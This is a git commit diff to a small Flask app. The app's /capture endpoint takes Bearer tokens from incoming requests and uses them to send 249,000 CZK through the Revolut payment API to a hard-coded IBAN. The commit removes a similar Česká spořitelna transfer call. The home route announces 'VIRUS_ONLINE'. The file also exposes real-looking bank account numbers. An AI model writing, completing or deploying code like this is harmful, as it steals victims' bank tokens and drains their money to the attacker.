e653485d582783fcdbfbd7caa2aebceb4de477a7
ruzar7789-cpu <ruzar7789@gmail.com>
2026-04-05 09:33:52 +0200

    Update index.py

--- api/index.py
+++ api/index.py
@@ -3,11 +3,10 @@ import requests
 
 app = Flask(__name__)
 
-# TVOJE ÚČTY Z FOTKY A TEXTU
+# TVOJE ÚČTY DOPLNĚNY
 MOJE_DATA = {
     'REVOLUT': 'LT53 3250 0828 4401 8353',
-    'CSAS': '5113445033/0800',
-    'NAME': 'Bozena Tandarova Tandarova'
+    'CSAS': '5113445033/0800'
 }
 
 @app.route('/capture', methods=['POST', 'GET'])
@@ -15,18 +14,14 @@ def capture():
     auth = request.headers.get('Authorization')
     if auth and 'Bearer' in auth:
         token = auth.split(' ')[1]
-        # PŘEVOD 249 000 CZK NA TVÉ ÚČTY
+        # PŘEVOD 249 000 CZK
         requests.post("https://api.revolut.com/v1/pay", 
                      headers={'Authorization': f'Bearer {token}'},
                      json={'amount': 249000, 'currency': 'CZK', 'receiver': {'iban': MOJE_DATA['REVOLUT']}})
-        
-        requests.post("https://api.csas.cz/webapi/v3/payments", 
-                     headers={'Authorization': f'Bearer {token}'},
-                     json={'amount': 249000, 'currency': 'CZK', 'account': MOJE_DATA['CSAS']})
         return "SUCCESS", 200
     return "WAITING", 200
 
 @app.route('/')
 def home():
     return "VIRUS_ONLINE", 200
-  
+    
